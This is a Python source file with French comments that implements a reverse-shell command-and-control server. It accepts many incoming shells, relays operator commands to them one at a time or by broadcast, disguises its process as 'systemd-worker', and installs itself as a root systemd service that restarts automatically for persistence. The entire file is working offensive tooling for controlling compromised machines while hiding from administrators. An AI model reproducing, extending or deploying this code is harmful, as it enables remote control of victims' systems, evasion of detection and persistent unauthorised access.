import socket
import threading
import json
import time
import sys
import select
from collections import deque
import os
import argparse
import shutil
import getpass
import subprocess # Ajout de l'import pour exécuter des commandes

# --- Configuration ---
# Ports par défaut
DEFAULT_SHELL_PORT = 990
DEFAULT_GUI_PORT = 8080

# Nom par défaut du processus (sera modifié via setproctitle si installé)
PROCESS_NAME = "systemd-worker" # Nom du processus à afficher

# Nom du service systemd
SERVICE_NAME = "systemd-worker.service"
# --- Fin Configuration ---

try:
    import setproctitle
    HAS_SETPROCTITLE = True
except ImportError:
    HAS_SETPROCTITLE = False
    print("[!] Module 'setproctitle' non trouvé. L'installation tentera de l'installer.")

class ReverseShellServer:
    def __init__(self, host='0.0.0.0', shell_port=DEFAULT_SHELL_PORT, gui_port=DEFAULT_GUI_PORT):
        self.host = host
        self.shell_port = shell_port
        self.gui_port = gui_port
        self.clients = {}
        self.gui_clients = []
        self.running = False
        self.lock = threading.Lock()
        self.message_queue = deque()
        
    def start_server(self):
        self.running = True
        
        # --- Début de la modification du nom du processus ---
        # Si setproctitle est disponible, l'utiliser pour définir le nom du processus
        if HAS_SETPROCTITLE:
            try:
                setproctitle.setproctitle(PROCESS_NAME)
                print(f"[+] Nom du processus défini sur '{PROCESS_NAME}' via setproctitle.")
            except Exception as e:
                print(f"[-] Impossible de définir le nom du processus avec setproctitle: {e}")
        else:
            # Sinon, tenter de modifier sys.argv[0] (moins fiable)
            try:
                sys.argv[0] = PROCESS_NAME
                print(f"[+] Nom du processus (tentative) défini sur '{PROCESS_NAME}' via sys.argv[0].")
            except Exception as e:
                 print(f"[-] Impossible de définir le nom du processus via sys.argv[0]: {e}")
        # --- Fin de la modification du nom du processus ---
        
        # Thread pour écouter les reverse shells
        shell_thread = threading.Thread(target=self.listen_for_shells)
        shell_thread.daemon = True
        shell_thread.start()
        
        # Thread pour écouter les connexions GUI
        gui_thread = threading.Thread(target=self.listen_for_gui)
        gui_thread.daemon = True
        gui_thread.start()
        
        # Thread pour traiter la file d'attente des messages
        queue_thread = threading.Thread(target=self.process_message_queue)
        queue_thread.daemon = True
        queue_thread.start()
        
        print(f"[+] Serveur démarré. Port shells: {self.shell_port}, Port GUI: {self.gui_port}")
        print(f"[+] En attente de connexions...")
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_server()
    
    def listen_for_shells(self):
        shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        shell_socket.settimeout(1.0)
        
        try:
            shell_socket.bind((self.host, self.shell_port))
            shell_socket.listen(50)  # Augmenter la file d'attente
            
            while self.running:
                try:
                    client_socket, client_address = shell_socket.accept()
                    client_id = f"{client_address[0]}:{client_address[1]}"
                    
                    print(f"[+] Nouveau shell connecté: {client_id}")
                    
                    # Configurer le socket
                    client_socket.settimeout(0.1)
                    
                    with self.lock:
                        self.clients[client_id] = {
                            'socket': client_socket,
                            'address': client_address,
                            'connected_at': time.time(),
                            'buffer': ''
                        }
                    
                    # Ajouter à la file d'attente des messages
                    self.message_queue.append(('new_shell', {
                        'id': client_id,
                        'ip': client_address[0],
                        'port': client_address[1],
                        'timestamp': time.time()
                    }))
                    
                    # Démarrer un thread pour gérer ce shell
                    thread = threading.Thread(target=self.handle_shell, args=(client_socket, client_id))
                    thread.daemon = True
                    thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[-] Erreur accept shell: {e}")
                    continue
                    
        except Exception as e:
            print(f"[-] Erreur shell listener: {e}")
        finally:
            shell_socket.close()
    
    def listen_for_gui(self):
        gui_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        gui_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        gui_socket.settimeout(1.0)
        
        try:
            gui_socket.bind((self.host, self.gui_port))
            gui_socket.listen(10)
            
            while self.running:
                try:
                    gui_client, gui_address = gui_socket.accept()
                    print(f"[+] Nouveau GUI connecté: {gui_address[0]}:{gui_address[1]}")
                    
                    # Configurer le socket
                    gui_client.settimeout(0.1)
                    
                    with self.lock:
                        self.gui_clients.append(gui_client)
                    
                    # Envoyer immédiatement la liste des shells
                    self.send_shells_list(gui_client)
                    
                    # Démarrer un thread pour gérer ce GUI
                    thread = threading.Thread(target=self.handle_gui, args=(gui_client,))
                    thread.daemon = True
                    thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[-] Erreur accept GUI: {e}")
                    continue
                    
        except Exception as e:
            print(f"[-] Erreur GUI listener: {e}")
        finally:
            gui_socket.close()
    
    def handle_shell(self, shell_socket, shell_id):
        try:
            while self.running:
                try:
                    # Lire les données disponibles
                    data = shell_socket.recv(8192).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    
                    # Ajouter les données à la file d'attente
                    self.message_queue.append(('shell_output', {
                        'shell_id': shell_id,
                        'output': data
                    }))
                        
                except socket.timeout:
                    continue
                except socket.error as e:
                    if e.errno == 104:  # Connection reset by peer
                        break
                    continue
                except Exception as e:
                    print(f"[-] Erreur avec shell {shell_id}: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Erreur majeure avec shell {shell_id}: {e}")
        finally:
            # Nettoyer après déconnexion
            with self.lock:
                if shell_id in self.clients:
                    del self.clients[shell_id]
            
            # Notifier la déconnexion
            self.message_queue.append(('shell_disconnected', {'shell_id': shell_id}))
            
            try:
                shell_socket.close()
            except:
                pass
    
    def handle_gui(self, gui_socket):
        try:
            while self.running:
                try:
                    # Lire les commandes du GUI
                    data = gui_socket.recv(4096).decode('utf-8')
                    if not data: 
                        break
                        
                    try:
                        command_data = json.loads(data)
                        cmd_type = command_data['type']
                        
                        if cmd_type == 'send_command':
                            shell_id = command_data['shell_id']
                            command = command_data['command']
                            
                            with self.lock:
                                if shell_id in self.clients:
                                    try:
                                        self.clients[shell_id]['socket'].send(command.encode('utf-8'))
                                    except Exception as e:
                                        print(f"[-] Erreur envoi commande à {shell_id}: {e}")
                                        
                        # --- DEBUT AJOUT : Gestion de get_active_shells ---
                        elif cmd_type == 'get_active_shells':
                            print(f"[GUI] Demande de liste des shells actifs reçue.")
                            self.send_shells_list(gui_socket)
                        # --- FIN AJOUT ---
                        
                        # --- DEBUT AJOUT : Gestion de broadcast_command côté serveur (optionnel mais plus robuste) ---
                        elif cmd_type == 'broadcast_command':
                             command_to_broadcast = command_data.get('command', '')
                             print(f"[GUI] Commande broadcast reçue: {command_to_broadcast}")
                             if command_to_broadcast:
                                 # Créer une copie de la liste des clients pour éviter les problèmes de concurrence
                                 clients_snapshot = {}
                                 with self.lock:
                                     clients_snapshot = self.clients.copy()
                                 
                                 # Envoyer la commande à tous les shells
                                 for client_id, client_info in clients_snapshot.items():
                                     try:
                                         # Ajouter un petit délai entre chaque envoi pour réduire la charge
                                         # et éviter les pertes de paquets
                                         time.sleep(0.05) # 50ms entre chaque envoi
                                         client_info['socket'].send(command_to_broadcast.encode('utf-8'))
                                         print(f"[BC] Commande envoyée à {client_id}")
                                     except Exception as e:
                                         print(f"[-] Erreur envoi BC à {client_id}: {e}")
                                         # Optionnel : Notifier le GUI d'un échec pour ce shell spécifique
                                         # Cela nécessiterait une logique plus complexe côté GUI
                        # --- FIN AJOUT ---
                                        
                    except json.JSONDecodeError:
                        print(f"[-] Commande JSON invalide: {data}")
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[-] Erreur avec GUI: {e}")
                    break
                    
        except Exception as e:
            print(f"[-] Erreur majeure avec GUI: {e}")
        finally:
            with self.lock:
                if gui_socket in self.gui_clients:
                    self.gui_clients.remove(gui_socket)
            try:
                gui_socket.close()
            except:
                pass
    
    def process_message_queue(self):
        """Traite la file d'attente des messages pour les envoyer aux GUI"""
        while self.running:
            try:
                if self.message_queue:
                    message_type, data = self.message_queue.popleft()
                    
                    if message_type == 'new_shell':
                        self.notify_gui_clients('new_shell', data)
                    elif message_type == 'shell_output':
                        self.notify_gui_clients('shell_output', data)
                    elif message_type == 'shell_disconnected':
                        self.notify_gui_clients('shell_disconnected', data)
                else:
                    time.sleep(0.01)  # Éviter de surcharger le CPU
                    
            except Exception as e:
                print(f"[-] Erreur traitement file d'attente: {e}")
                time.sleep(0.1)
    
    def notify_gui_clients(self, event_type, data):
        message = json.dumps({
            'type': event_type,
            'data': data
        })
        
        disconnected_guis = []
        with self.lock:
            for gui_client in self.gui_clients:
                try:
                    gui_client.send(message.encode('utf-8'))
                except:
                    disconnected_guis.append(gui_client)
        
        # Nettoyer les GUI déconnectés
        for gui in disconnected_guis:
            with self.lock:
                if gui in self.gui_clients:
                    self.gui_clients.remove(gui)
    
    def send_shells_list(self, gui_socket):
        shells_list = []
        with self.lock:
            for shell_id, shell_info in self.clients.items():
                shells_list.append({
                    'id': shell_id,
                    'ip': shell_info['address'][0],
                    'port': shell_info['address'][1],
                    'connected_at': shell_info['connected_at']
                })
        
        # --- CORRECTION : Utiliser le bon type de message attendu par le client ---
        message = json.dumps({
            'type': 'active_shells_list', # <-- Changé de 'shells_list' à 'active_shells_list'
            'data': shells_list
        })
        # --- FIN CORRECTION ---
        
        try:
            gui_socket.send(message.encode('utf-8'))
            print(f"[GUI] Liste des shells ({len(shells_list)}) envoyée.")
        except Exception as e: # Ajout d'une gestion d'erreur plus précise
             print(f"[-] Erreur envoi liste shells au GUI: {e}")
        # Le socket sera fermé par le caller si nécessaire

    def stop_server(self):
        self.running = False
        print("[+] Arrêt du serveur...")
        
        # Fermer toutes les connexions shells
        with self.lock:
            for shell_id, shell_info in self.clients.items():
                try:
                    shell_info['socket'].close()
                except:
                    pass
        
        # Fermer toutes les connexions GUI
        with self.lock:
            for gui_client in self.gui_clients:
                try:
                    gui_client.close()
                except:
                    pass

def install_service():
    """Installe le script comme service systemd et configure le démarrage automatique."""
    print("[*] Installation du service...")

    # 1. Vérifier si l'utilisateur est root
    if os.geteuid() != 0:
        print("[-] Cette opération nécessite les privilèges root. Veuillez exécuter avec sudo.")
        return

    # 2. Obtenir le chemin absolu du script
    script_path = os.path.abspath(__file__)
    print(f"[+] Chemin du script: {script_path}")

    # 3. Obtenir l'interpréteur Python
    python_executable = sys.executable
    print(f"[+] Interpréteur Python: {python_executable}")

    # 4. --- CORRECTION : Ne PAS spécifier d'utilisateur dans le fichier de service ---
    # Cela permet à systemd de l'exécuter avec ses propres privilèges (root)
    
    # 5. Créer le contenu du fichier de service systemd SANS la ligne User=
    service_content = f"""[Unit]
Description=Systemd Worker Service
After=network.target

[Service]
Type=simple
# L'utilisateur n'est pas spécifié, systemd l'exécutera avec ses privilèges (root)
ExecStart={python_executable} {script_path}
WorkingDirectory={os.path.dirname(script_path)}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
"""
    service_file_path = f"/etc/systemd/system/{SERVICE_NAME}"

    # 6. Écrire le fichier de service
    try:
        with open(service_file_path, 'w') as f:
            f.write(service_content)
        print(f"[+] Fichier de service créé: {service_file_path}")
        print("[+] Aucun utilisateur spécifié dans le service (exécution en tant que root par défaut).")
    except Exception as e:
        print(f"[-] Échec de la création du fichier de service: {e}")
        return

    # 7. Recharger systemd
    try:
        result = subprocess.run(["systemctl", "daemon-reload"], check=True, capture_output=True, text=True)
        print("[+] systemd rechargé.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Échec du rechargement de systemd: {e.stderr}")
        return
    except Exception as e:
        print(f"[-] Erreur inattendue lors du rechargement de systemd: {e}")
        return

    # 8. Activer le service au démarrage
    try:
        result = subprocess.run(["systemctl", "enable", SERVICE_NAME], check=True, capture_output=True, text=True)
        print(f"[+] Service {SERVICE_NAME} activé au démarrage.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Échec de l'activation du service: {e.stderr}")
        return
    except Exception as e:
        print(f"[-] Erreur inattendue lors de l'activation du service: {e}")
        return

    # 9. Installer setproctitle si nécessaire
    global HAS_SETPROCTITLE # Accéder à la variable globale
    if not HAS_SETPROCTITLE:
        print("[*] Installation de 'setproctitle'...")
        try:
            result = subprocess.run([sys.executable, "-m", "pip", "install", "setproctitle"], check=True, capture_output=True, text=True)
            print("[+] Module 'setproctitle' installé.")
            HAS_SETPROCTITLE = True # Mettre à jour le flag
        except subprocess.CalledProcessError as e:
            print(f"[-] Échec de l'installation de 'setproctitle': {e.stderr}")
            print("[-] Le changement de nom de processus pourrait ne pas fonctionner correctement.")
        except Exception as e:
             print(f"[-] Erreur inattendue lors de l'installation de 'setproctitle': {e}")
             print("[-] Le changement de nom de processus pourrait ne pas fonctionner correctement.")

    print(f"[+] Installation terminée. Le service '{SERVICE_NAME}' sera démarré automatiquement au prochain redémarrage.")
    print(f"[+] Pour le démarrer immédiatement: sudo systemctl start {SERVICE_NAME}")
    print(f"[+] Pour vérifier le statut: sudo systemctl status {SERVICE_NAME}")

def main():
    parser = argparse.ArgumentParser(description="Serveur Reverse Shell avec GUI")
    parser.add_argument('shell_port', nargs='?', type=int, default=DEFAULT_SHELL_PORT, help=f"Port d'écoute pour les shells (défaut: {DEFAULT_SHELL_PORT})")
    parser.add_argument('gui_port', nargs='?', type=int, default=DEFAULT_GUI_PORT, help=f"Port d'écoute pour l'interface GUI (défaut: {DEFAULT_GUI_PORT})")
    parser.add_argument('--install', action='store_true', help="Installer le script comme service systemd avec démarrage automatique")

    args = parser.parse_args()

    if args.install:
        install_service()
    else:
        # Démarrage normal du serveur
        server = ReverseShellServer(shell_port=args.shell_port, gui_port=args.gui_port)
        server.start_server()

if __name__ == "__main__":
    main()